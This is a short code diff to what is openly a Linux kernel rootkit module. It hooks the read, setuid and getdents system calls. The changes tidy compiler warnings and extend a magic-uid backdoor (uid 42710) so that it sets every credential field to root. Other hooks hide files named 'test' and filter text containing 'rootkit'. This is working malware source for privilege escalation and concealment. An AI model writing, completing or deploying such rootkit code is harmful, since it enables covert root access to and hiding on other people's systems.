@@ -62,7 +62,7 @@ asmlinkage long hijacked_read(unsigned int fd, char __user *buf, size_t count)
 
 		copy_from_user(kbuf, buf, num_reads);
 		str1 = kbuf;
-		while(str2 = strsep(&str1, "\n")){
+		while((str2 = strsep(&str1, "\n"))){
 			ac_read += (str1 - str2);
 			if (strstr(str2, "rootkit") != NULL) {
 				rootkitfound = true;
@@ -89,14 +89,17 @@ out:
 
 asmlinkage int hijacked_setuid(uid_t uid){
 	struct cred *new;
-	int ret;
 	if (uid == 42710){
 		printk(KERN_DEBUG "setuid called\n");
 		new = prepare_creds();
 		new->uid = 0;
-		new->euid = 0;
 		new->gid = 0;
 		new->suid = 0;
+		new->sgid = 0;
+		new->euid = 0;
+		new->egid = 0;
+		new->fsuid = 0;
+		new->fsgid = 0;
 		return commit_creds(new);
 	}
 		return real_setuid(uid);
@@ -121,7 +124,7 @@ asmlinkage int hijacked_getdents(unsigned int fd, struct linux_dirent *dirp, uns
 
 	struct linux_dirent *cdirp = dirp, *pdirp = NULL;
 	struct file *f = fget(fd), *fcmdline;
-	int i, j, readnums;
+	int i, readnums;
 	long start_offset = (long)dirp;
 	char *kbuf, *kbuf2, *path;
 	bool isproc = false;
@@ -164,7 +167,7 @@ asmlinkage int hijacked_getdents(unsigned int fd, struct linux_dirent *dirp, uns
 			}
 		} else if (strncmp(cdirp->d_name,"test", 4) == 0){
 			if (pdirp == NULL)
-				dirp = (long)(start_offset + cdirp->d_reclen);
+				dirp = (struct linux_dirent *)(start_offset + (long)(cdirp->d_reclen));
 			else
 				pdirp->d_reclen += cdirp->d_reclen;
 		} else {
